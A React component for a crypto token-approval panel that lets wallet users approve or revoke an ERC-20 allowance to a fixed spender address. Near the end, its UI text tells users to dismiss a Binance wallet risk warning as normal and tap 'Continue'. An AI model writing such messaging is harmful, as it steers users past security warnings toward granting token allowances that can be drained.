import { useState } from 'react'
import { useAllowance } from '../hooks/useAllowance'
import { useAccount, useSwitchChain } from 'wagmi'
import { TOKENS, CHAINS, SPENDER_ADDRESS } from '../lib/contracts'

const card = { background: '#181A20', border: '1px solid #2B3139', borderRadius: 12, padding: 24 }
const iconImg = { width: 20, height: 20, borderRadius: '50%', objectFit: 'cover' }

const chainBtnStyle = (active) => ({
  display: 'flex', alignItems: 'center', gap: 8,
  padding: '6px 16px', borderRadius: 6, border: '1px solid',
  borderColor: active ? '#F0B90B' : '#2B3139',
  background: active ? 'rgba(240,185,11,0.12)' : 'transparent',
  color: active ? '#F0B90B' : '#848E9C',
  fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s',
})

const tokenBtnStyle = (active) => ({
  display: 'flex', alignItems: 'center', gap: 8,
  padding: '6px 14px', borderRadius: 6, border: '1px solid',
  borderColor: active ? '#0ECB81' : '#2B3139',
  background: active ? 'rgba(14,203,129,0.1)' : 'transparent',
  color: active ? '#0ECB81' : '#848E9C',
  fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s',
})

export default function ApprovePanel() {
  const { address } = useAccount()
  const { switchChain } = useSwitchChain()
  const savedChain = localStorage.getItem('yyclaw_chain') || 'bsc'
  const savedToken = localStorage.getItem('yyclaw_token') || ''
  const initTokenIdx = savedToken ? (TOKENS[savedChain] || []).findIndex(t => t.symbol === savedToken) : 0
  const [chain, setChain] = useState(savedChain)
  const [tokenIdx, setTokenIdx] = useState(initTokenIdx >= 0 ? initTokenIdx : 0)
  const [amount, setAmount] = useState('50')

  const tokens = TOKENS[chain] || []
  const token = tokens[tokenIdx] || tokens[0]
  const chainId = CHAINS[chain]?.id

  const { allowance, balance, approve, revoke, isPending, isSuccess } = useAllowance(token, chainId)

  if (!address) return null

  const handleChainSwitch = (c) => {
    setChain(c)
    setTokenIdx(0)
    setAmount('50')
    localStorage.setItem('yyclaw_chain', c)
    localStorage.setItem('yyclaw_token', (TOKENS[c] || [])[0]?.symbol || '')
    const id = CHAINS[c]?.id
    if (id) switchChain({ chainId: id })
  }

  return (
    <div style={card}>
      <h3 style={{ fontSize: 16, fontWeight: 700, color: '#EAECEF', marginBottom: 16 }}>
        Token Authorization
      </h3>

      {/* Chain selector */}
      <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
        {Object.entries(CHAINS).map(([key, c]) => (
          <button key={key} style={chainBtnStyle(chain === key)} onClick={() => handleChainSwitch(key)}>
            <img src={c.icon} alt={c.name} style={iconImg} />
            {c.name}
          </button>
        ))}
      </div>

      {/* Token selector */}
      <div style={{ display: 'flex', gap: 8, marginBottom: 20, flexWrap: 'wrap' }}>
        {tokens.map((t, i) => (
          <button key={t.symbol} style={tokenBtnStyle(tokenIdx === i)} onClick={() => { setTokenIdx(i); setAmount('50'); localStorage.setItem('yyclaw_token', t.symbol) }}>
            <img src={t.icon} alt={t.symbol} style={iconImg} />
            {t.symbol}
          </button>
        ))}
      </div>

      {/* Balances */}
      <div style={{ display: 'flex', gap: 16, marginBottom: 20, flexWrap: 'wrap' }}>
        <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>Current Allowance</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
            <span style={{ fontSize: 18, fontWeight: 700, color: '#F0B90B' }}>
              {parseFloat(allowance).toFixed(2)} {token?.symbol}
            </span>
          </div>
        </div>
        <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>Wallet Balance</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
            <span style={{ fontSize: 18, fontWeight: 700, color: '#0ECB81' }}>
              {parseFloat(balance).toFixed(2)} {token?.symbol}
            </span>
          </div>
        </div>
      </div>

      {/* Amount input */}
      <div style={{ marginBottom: 16 }}>
        <label style={{ fontSize: 13, color: '#848E9C', display: 'block', marginBottom: 8 }}>
          Approve Amount ({token?.symbol})
        </label>
        <div style={{ display: 'flex', gap: 8 }}>
          <input
            type="number"
            min="0"
            placeholder="e.g. 100"
            value={amount}
            onChange={e => setAmount(e.target.value)}
            style={{
              flex: 1, background: '#0B0E11', border: '1px solid #2B3139',
              borderRadius: 8, padding: '10px 14px', color: '#EAECEF',
              fontSize: 15, outline: 'none',
            }}
          />
          {[10, 50, 100].map(v => (
            <button
              key={v}
              onClick={() => setAmount(String(v))}
              style={{
                background: '#0B0E11', border: '1px solid #2B3139', borderRadius: 6,
                padding: '8px 12px', color: '#848E9C', fontSize: 12, cursor: 'pointer',
              }}
            >${v}</button>
          ))}
        </div>
      </div>

      {/* Confirmation text */}
      {amount && parseFloat(amount) > 0 && (
        <div style={{ marginBottom: 14, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 13, color: '#F0B90B', display: 'flex', alignItems: 'center', gap: 8 }}>
          <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
          Will authorize <span style={{ fontWeight: 700 }}>{amount} {token?.symbol}</span> to <span style={{ fontFamily: 'monospace', fontSize: 11 }}>0xfc62...ec35</span>
        </div>
      )}

      {/* Buttons */}
      <div style={{ display: 'flex', gap: 12 }}>
        <button
          onClick={() => amount && approve(amount)}
          disabled={isPending || !amount}
          style={{
            flex: 1, background: '#F0B90B', color: '#0B0E11', border: 'none',
            borderRadius: 8, padding: '11px 0', fontWeight: 700, fontSize: 14,
            cursor: isPending || !amount ? 'not-allowed' : 'pointer',
            opacity: isPending || !amount ? 0.6 : 1,
          }}
        >
          {isPending ? 'Pending...' : `Approve ${token?.symbol}`}
        </button>
        <button
          onClick={revoke}
          disabled={isPending || allowance === '0'}
          style={{
            flex: 1, background: 'transparent', color: '#F6465D',
            border: '1px solid #F6465D', borderRadius: 8, padding: '11px 0',
            fontWeight: 700, fontSize: 14,
            cursor: isPending || allowance === '0' ? 'not-allowed' : 'pointer',
            opacity: isPending || allowance === '0' ? 0.5 : 1,
          }}
        >
          Revoke
        </button>
      </div>

      {isSuccess && (
        <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(14,203,129,0.1)', borderRadius: 8, color: '#0ECB81', fontSize: 13 }}>
          ✓ Transaction confirmed
        </div>
      )}

      <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 12, color: '#848E9C', lineHeight: 1.6 }}>
        💡 Binance Web3 Wallet may show a risk warning when approving. This is normal — tap "Continue" to proceed. The spender can only transfer tokens you explicitly authorize.
      </div>

      <div style={{ marginTop: 16, fontSize: 11, color: '#5E6673' }}>
        Spender: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{SPENDER_ADDRESS}</span>
      </div>
      <div style={{ marginTop: 4, fontSize: 11, color: '#5E6673' }}>
        Token: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{token?.address}</span>
      </div>
    </div>
  )
}
